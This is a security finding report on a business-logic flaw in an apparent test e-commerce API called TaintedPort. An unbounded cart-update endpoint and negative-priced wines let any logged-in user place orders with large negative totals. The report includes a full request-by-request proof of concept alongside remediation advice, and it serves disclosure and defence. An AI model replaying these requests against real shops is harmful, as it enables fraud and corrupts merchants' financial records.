# Business Logic: Authenticated user can create durable orders with negative totals via unbounded PUT /cart/update combined with negative-priced catalog items

**ID:** vuln-0010
**Severity:** MEDIUM
**Found:** 2026-07-20 11:50:36 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /orders
**Method:** POST
**CWE:** CWE-840
**CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

## Description

The TaintedPort ordering flow (`POST /orders`) does not enforce a lower bound of zero on the derived order total before durably persisting the order row. Combined with two supporting weaknesses — (a) the wine catalog contains items with negative unit prices (e.g. `wine_id=8` "Quinta do Crasto Reserva Old Vines" at `price=-9999`, `wine_id=17` at `-7777`, `wine_id=7` at `-5000`, plus five other wines with negative prices), and (b) `PUT /cart/update` performs neither a lower nor an upper bound check on the `quantity` field — any authenticated user can force the server-computed cart total to an arbitrarily large negative number and check out. The resulting order is stored in `pending` status with the negative total intact and enters the normal fulfillment pipeline. Because the shop is cash-on-delivery (no payment step in the ordering flow), a stored negative total represents a contractual obligation on the merchant to pay the buyer that amount on delivery.

Positively verified during validation:
- `POST /cart/add` correctly rejects `quantity` outside 1..12 (HTTP 400 "Quantity must be between 1 and 12.").
- `PUT /cart/update` accepts `quantity=500` (validation), and previously the tester confirmed values of `-3`, `0`, `999`, `99999`, `1000`, and `2147483647` are all accepted with no error.
- Client-supplied `total` and `status` fields in the `POST /orders` body ARE ignored server-side (verified: sending `"total":99999,"status":"delivered"` produced a stored row with `total=-2499999,status="pending"`). The vulnerability is not mass-assignment on those fields; it is the absence of a `total>=0` invariant check on the server-computed value.

Order `#140` was created live during validation with `total=-2499999,status=pending`, and a second identical run via `verify.py` created `#141` with `total=-2500000,status=pending`.

## Attack Flow

```
┌────────────────────────────────────────────────────────────────────────────┐
│  NEGATIVE-TOTAL ORDER via unbounded PUT /cart/update + negative-price seed │
└────────────────────────────────────────────────────────────────────────────┘

Prerequisites
  • Any self-registered authenticated user (PR:L, no admin)
  • >=1 wine with price < 0 in the catalog (8 present: ids 3, 5, 6, 7, 8, 10, 11, 17)

  Attacker (any user)                       api.taintedport.com
  -------------------                       ---------------------
                                                    │
   (1) POST /auth/login  ──────────────────────────►│
       { email, password }                          │
                                            ◄───────┤  200 { token: eyJ... }
                                                    │
   (2) GET /wines  ────────────────────────────────►│
                                            ◄───────┤  wine_id=7  price=-5000
                                                    │  wine_id=8  price=-9999   [seed]
                                                    │
   (3) POST /cart/add  ────────────────────────────►│
       { wine_id:7, quantity:1 }                    │  Guard: qty in [1..12] OK
                                            ◄───────┤  200 ok
                                                    │
   (4) POST /cart/add   { qty:100 } ───────────────►│  Guard: qty in [1..12] OK
                                            ◄───────┤  400  "Quantity must be
                                                    │         between 1 and 12."
                                                    │        (control sample)
                                                    │
   (5) PUT /cart/update  ──────────────────────────►│  ┌──────────────────────┐
       { wine_id:7, quantity:500 }                  │  │ GAP #1: NO qty check │
                                            ◄───────┤  └──────────────────────┘
                                                    │  200 "Cart updated"
                                                    │
   (6) GET /cart  ─────────────────────────────────►│
                                            ◄───────┤  subtotal = -2,500,000
                                                    │  total    = -2,499,999   [X]
                                                    │
   (7) POST /orders                                 │  ┌────────────────────────┐
       { shipping_address, delivery_notes,          │  │ GAP #2: total<0        │
         total:99999,        <-- ignored (ok)       │  │ invariant NOT checked  │
         status:"delivered"  <-- ignored (ok) ─────►│  └────────────────────────┘
       }                                            │  server recomputes total
                                                    │  writes orders row
                                            ◄───────┤  201 { order_id:140 }
                                                    │
   (8) GET /orders/140  ───────────────────────────►│
                                            ◄───────┤  { id:140,
                                                    │    total:-2499999,
                                                    │    status:"pending", ...}  [durable]

  ┌──────────────────────────────────────────────────────────────────────────┐
  │  Downstream impact (cash on delivery):                                   │
  │  order_id=140 enters normal fulfillment queue in "pending" status;       │
  │  the merchant's ledger indicates it owes |−2,499,999| to the buyer.      │
  └──────────────────────────────────────────────────────────────────────────┘

  Root cause
  ----------
  "orders.total >= 0" invariant enforced in NEITHER
    (a) POST /orders application code, NOR
    (b) DB CHECK constraint on orders.total,
  AND cart-line qty validation exists on POST /cart/add but is missing from
  the sibling PUT /cart/update mutation path (defence-in-depth failure).
```

## Impact

Direct financial and reputational impact on the merchant with no privilege escalation required.

- Any authenticated user (self-registration exists) can create durable `pending` orders with negative totals; there is no rate limit, no admin review gate, and no payment authorization step between placement and the standard order pipeline.
- In cash-on-delivery mode, every unit fulfilled against a negative-total order is a delivery of goods for which the merchant's ledger indicates the customer is owed money. If downstream ledgering, refund flows, partner settlement or accounting reconciliation are driven off the `orders.total` column, each such order silently corrupts financial state by up to the full magnitude of the total.
- The negative amount is bounded only by the product of the most negative catalog price and the largest accepted integer quantity. The tester demonstrated `qty=2147483647` was accepted by `PUT /cart/update`, so a single order can push the ledger to below `-21 trillion` (INT32_MAX × -9999). Validation was performed at a conservative `qty=500`, which is already unambiguously damaging (−2,499,999 per order).
- Because the same durable row is exposed to normal downstream consumers (fulfillment, admin views, reporting), the corruption is silent — there is no "negative order" branch to alert on.

The finding is a clear violation of a fundamental business invariant ("orders always represent a debt owed by the buyer to the merchant") and results in Integrity: High for financial data.

## Technical Analysis

Two independent server-side control gaps combine to break the "order total is a non-negative amount owed to the merchant" invariant:

1. **`PUT /cart/update` performs no bounds validation on `quantity`.** The endpoint accepts any signed integer without rejecting values below 1 or above the per-line ceiling that `POST /cart/add` enforces. Confirmed accepted values include `500` (validation), `-3` and `0` (tester — both silently remove the row), `999`, `1000`, `99999`, and `2147483647`. The presence of a strict `1..12` bound on `POST /cart/add` (verified — HTTP 400 "Quantity must be between 1 and 12.") establishes that the developer knew the invariant but only enforced it on one of the two write paths.

2. **`POST /orders` does not enforce `total >= 0`.** The endpoint correctly recomputes `total = sum(item.price * item.quantity)` from the current server-side cart state and correctly ignores client-supplied `total` / `status` fields in the request body (verified — no mass-assignment on those fields). However, before writing the `orders` row it does not defensively assert that the computed total is non-negative. As a result any cart whose current subtotal is negative — which is trivially reachable given #1 and negative-priced seed data — becomes a durable order in `pending` status.

**Auxiliary:** the wine catalog contains eight items with `price < 0` at the time of testing (`ids 3, 5, 6, 7, 8, 10, 11, 17`). Whether this is intended demo data or a seeding accident, the checkout code path must not rely on their absence to preserve the total invariant. A per-line negative quantity on a positive-priced wine via `PUT /cart/update` would produce the same negative subtotal even in the absence of negative-priced products.

**Root cause:** the "order total is non-negative" business invariant is enforced neither by a database `CHECK` constraint on `orders.total` (and `cart_items.quantity`) nor by an application-layer guard in the checkout code path. The `1..12` cart-line quantity check exists in only one of the two mutation endpoints.

**Absence of mass-assignment:** it is worth explicitly noting that `POST /orders` correctly ignores `total` and `status` fields sent in the request body. The finding is not a mass-assignment finding — it is an invariant / business-logic finding on the server-computed value.

## Proof of Concept

Prerequisites: an authenticated user (self-registration is available). No special role, no admin credentials, no opaque identifiers required. Reproduces reliably against the live API.

1. Authenticate: `POST /auth/login` with any valid credentials → obtain Bearer JWT.
2. `GET /wines?limit=100` — confirm the target catalog still contains at least one wine with `price < 0` (validation observed 8 such wines: ids 3, 5, 6, 7, 8, 10, 11, 17).
3. Empty the cart by iterating `DELETE /cart/remove/{wine_id}` over any existing lines.
4. `POST /cart/add` body `{"wine_id":7,"quantity":1}` → 200 OK. (Confirming that the per-add cap remains: `POST /cart/add {"wine_id":7,"quantity":100}` returns HTTP 400 "Quantity must be between 1 and 12.")
5. `PUT /cart/update` body `{"wine_id":7,"quantity":500}` → 200 OK `{"success":true,"message":"Cart updated"}` — **the amplification step: this endpoint enforces no bound.**
6. `GET /cart` → `{"items":[{"wine_id":7,"price":-5000,"quantity":500,"subtotal":-2500000}], "total":-2499999}`.
7. `POST /orders` with any valid shipping_address (optionally including `"total":99999,"status":"delivered"` to demonstrate that those fields are ignored) → HTTP 201 `{"success":true,"order_id":140,"message":"Order placed successfully"}`.
8. `GET /orders/140` → durable `{"id":140,"user_id":373,"total":-2499999,"status":"pending", …}`.

Live observations during validation: order_id=140 (this validation), order_id=141 (via `verify.py`), order_id=142 (via `poc.py` non-interactive run). See `poc/poc.py` (rich, human-facing) and `poc/verify.py` (regression check, greppable `[VULNERABLE]` / `[NOT VULNERABLE]` verdict).

```
See poc_script_path
```

## Evidence

### 1. Authenticate as low-privileged user

**Request:**
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"luis.grangeia@snyk.io","password":"***"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"eyJ...","user":{"id":373,"is_admin":false}}
```

> Obtain a Bearer JWT for a normal, self-registerable user. No admin role required.

### 2. Confirm catalog contains negative-priced wines

**Request:**
```http
GET /wines?limit=100 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"wines":[..., {"id":7,"name":"Esporao Reserva Tinto","price":-5000, ...}, {"id":8,"name":"Quinta do Crasto Reserva Old Vines","price":-9999, ...}, {"id":17,"name":"Blandy's 10 Year Malmsey Madeira","price":-7777, ...}, ...]}
```

> Eight wines in the seed catalog carry negative unit prices (ids 3, 5, 6, 7, 8, 10, 11, 17). They are user-facing and addable to carts like any other product.

### 3. POST /cart/add enforces per-add cap (control sample)

**Request:**
```http
POST /cart/add HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"wine_id":7,"quantity":100}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":false,"message":"Quantity must be between 1 and 12."}
```

> Sanity check: the ADD endpoint DOES validate 1<=quantity<=12. Any assumption that a similar guard exists on the UPDATE endpoint would be misplaced.

### 4. POST /cart/add with quantity=1 (seed the cart line)

**Request:**
```http
POST /cart/add HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"wine_id":7,"quantity":1}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Item added to cart"}
```

> Add one unit of a negative-priced wine (Esporao Reserva Tinto, price=-5000).

### 5. PUT /cart/update amplifies quantity WITHOUT any bounds check — root cause #1

**Request:**
```http
PUT /cart/update HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"wine_id":7,"quantity":500}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Cart updated"}
```

> The UPDATE path silently accepts quantities that ADD would refuse. Tester also confirmed qty=2147483647 (INT32 max) and negative quantities are accepted here.

### 6. GET /cart — server-computed total is negative

**Request:**
```http
GET /cart HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"items":[{"id":377,"wine_id":7,"wine_name":"Esporao Reserva Tinto","price":-5000,"quantity":500,"subtotal":-2500000}],"total":-2499999}
```

> Server computes total as sum(price*quantity). It correctly reflects the cart state — but nothing rejects the negative aggregate.

### 7. POST /orders — checkout accepts the negative-total cart (root cause #2)

**Request:**
```http
POST /orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"shipping_address":{"name":"Validator","street":"Test St","city":"Lx","postal_code":"1000-000","phone":"+351000000000"},"delivery_notes":"validator-10 PoC","total":99999,"status":"delivered"}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"order_id":140,"message":"Order placed successfully"}
```

> Order created despite negative total. Client-supplied 'total' and 'status' fields in the body are attempts at mass-assignment; they are (correctly) ignored server-side — confirmed by the response below.

### 8. GET /orders/140 — durable persisted order with negative total

**Request:**
```http
GET /orders/140 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJ...
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":140,"user_id":373,"total":-2499999,"status":"pending","shipping_name":"Validator","items":[{"wine_id":7,"price":-5000,"quantity":500,"subtotal":-2500000}]}}
```

> Order is durably persisted with total=-2,499,999 in 'pending' status. Server ignored client-supplied 'total':99999 and 'status':'delivered' (confirming no mass-assignment on those fields) but did not enforce total>=0. In TaintedPort's cash-on-delivery model this row represents a merchant obligation to pay the buyer |total| on delivery.


## Remediation

Apply defence-in-depth — each layer below independently prevents this class of failure:

1. **Enforce the invariant at checkout.** In the `POST /orders` handler, immediately after computing `total = sum(item.price * item.quantity)` and before inserting the `orders` row, assert `total > 0` (or at minimum `total >= 0`). Reject with HTTP 400 and a clear message otherwise. Add an equivalent guard so that no individual `subtotal` can be negative.

2. **Fix `PUT /cart/update` to apply the same input validation `POST /cart/add` already uses.** Reject non-integers, non-positives, and values above the per-line ceiling (currently `1..12`). Ensure the validator is invoked on every mutation path — extract the check into a shared helper and reference it from both endpoints.

3. **Enforce the invariants at the database layer.** Add `CHECK (quantity BETWEEN 1 AND 12)` on `cart_items.quantity` and `CHECK (total >= 0)` on `orders.total`. This ensures no future code path can violate the invariant regardless of application logic.

4. **Sanitize the catalog.** No production wine row should have `price < 0`. Either delete the offending seed rows (ids 3, 5, 6, 7, 8, 10, 11, 17 at the time of testing), mark them `is_active = false`, or add `WHERE price > 0` to all catalog queries and to the "wine addable to cart" query so negative-priced items cannot be placed on a cart in the first place.

5. **Add regression tests.** Integration tests must assert (a) `POST /orders` returns 4xx when the derived total is non-positive, (b) `PUT /cart/update` returns the same 4xx as `POST /cart/add` for `quantity < 1`, `quantity > 12`, non-integer, missing, and negative values, and (c) no order row can be inserted with `total < 0`.

6. **Detective control.** Add an alert on any order row with `total <= 0` to catch invariant violations in production immediately.

## Conditions for Severity Increase

Two conditions would escalate impact further:

- If the merchant's downstream ledger / refund / partner-settlement systems process negative order totals as monetary refunds without human review, this becomes a direct funds-withdrawal primitive (Confidentiality/Integrity/Availability of financial systems, likely Scope: Changed).
- If `PUT /cart/update` is used with `quantity` at or near INT32_MAX (the tester confirmed `2147483647` is accepted), a single order can push the persisted total below −21 trillion, which may cause integer overflow / column-type errors in downstream systems, escalating from data-integrity harm to availability impact on the accounting / fulfillment pipeline.

Neither condition is required for the finding as scored — I:H reflects durable, silent corruption of financial-relevant order data reachable by any authenticated user, which is what was directly demonstrated.
